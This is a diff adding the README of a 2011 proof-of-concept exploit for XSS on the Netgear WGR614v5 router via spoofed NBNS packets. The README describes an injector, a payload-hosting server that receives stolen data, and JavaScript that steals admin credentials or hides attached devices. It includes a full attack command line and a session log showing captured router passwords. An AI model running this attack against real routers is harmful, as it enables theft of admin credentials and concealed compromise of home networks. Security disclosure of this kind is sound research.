@@ -1,0 +1,68 @@
+XSS Using NBNS on the WGR614v5: Proof of Concept Code
+Simon Weber <sweb090@gmail.com>
+October 2011
+
+
+Files:
+	README
+	LICENSE: 
+		Code uses the GPLv2 license (because Scapy does).
+
+	driver.py
+
+	nbns_injector:
+		Listens for, creates and sends the spoofed NBNS
+		packets.
+
+	nbns_server: 
+		A simple http server to host exploits and receive
+		data from them.
+
+	exploit_js/steal_admin.js:
+		Built-in exploit for stealing admin
+		credentials.
+
+	exploit_js/hide_rows.js: 
+		Built-in exploit for hiding rows of the
+		attached devices listing.
+	
+
+Usage:  
+	You probably want to use driver.py. Running with no arguments
+	gets you the option list. The easiest way to run is to use the
+	built-in server with the -s flag. Here's an example of a
+	successful admin credential stealing session with the built-in
+	server:
+
+		$ python driver.py -r 192.168.1.1 -a 192.168.1.3 -i eth1 -f 192.168.1.111 -t 1 -s
+
+	        WARNING: no route found for IPv6 destination :: (no default route?)
+	   	Server starting: [done]
+	   	Injector started.
+	   	Ready to inject.
+	   	192.168.1.2 - - [14/Oct/2011 14:30:07] "GET /exploit_js/steal_admin.js HTTP/1.1" 200 -
+	   	{'super_passwd': 'Geardog', 'http_passwd': 'password', 'super_username': 'Gearguy', 'http_username': 'admin'}
+	   	^C
+		Injector stopped.
+	        Server stopping: [done]
+
+	Once you run, you'll first see the init messages about the
+	various components starting. Next, it will wait to sniff one
+	request from the router. Once this request is used to precompute
+	later responses, you'll see "Ready to inject". The next time a
+	request is seen, the spoofed packets are sent, and the exploit
+	is run.  In this example, we see the server logging that the
+	external exploit code was read. The next line is the server
+	parsing out admin credentials from the POSTed configuration
+	file.
+	
+
+	The injector and server can both stand alone, if anyone has
+	any other use for them. Feel free to contact me if you have
+	questions when using my code.
+
+	Note that if hosting the built-in exploit javascript elsewhere
+	(with -h), driver.py expects them to be located at
+	/exploit_js/<file>.
+
+	Code was tested on Python 2.6.5 and Scapy 2.1.0.
